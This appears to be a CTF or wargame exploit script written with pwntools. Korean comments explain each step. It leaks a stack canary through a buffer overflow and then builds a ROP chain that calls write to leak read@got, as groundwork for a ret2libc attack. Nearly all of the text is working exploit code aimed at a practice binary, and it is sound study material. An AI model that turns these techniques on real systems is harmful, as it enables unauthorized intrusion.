from pwn import *

def slog(name, addr):
    return success(': '.join([name, hex(addr)]))


# reading binary file
p = process('./rop')
e = ELF('./rop')
libc = ELF('./libc.so.6')       # reading libc.so.6 file as Executable and Linkable Format -> stored in specific place 
                                # system 함수 호출용

# [1] leak canary
buf = b'A' * 0x39               # buf2rbp = 0x40, buf2cnry = 0x40 - 0x8 = 0x38, cnry's 1st num = x00 즉 0x38+1 이후 cnry값 획득
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

# [2] Exploit
read_plt = e.plt['read']
write_plt = e.plt['write']
read_got = e.got['read']

pop_rdi = 0x0000000000400853        # ROPgadget --binary rop --re "pop rdi"
pop_rsi_r15 = 0x0000000000400851    # ROPgadget --binary rop --re "pop rsi" --> need to check this part

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8      # buf + canary + sfp

# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)                        # (1, , )
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)    # (1, read@got, 0)
payload += p64(write_plt)                               # write(1, read@got, 0) 호출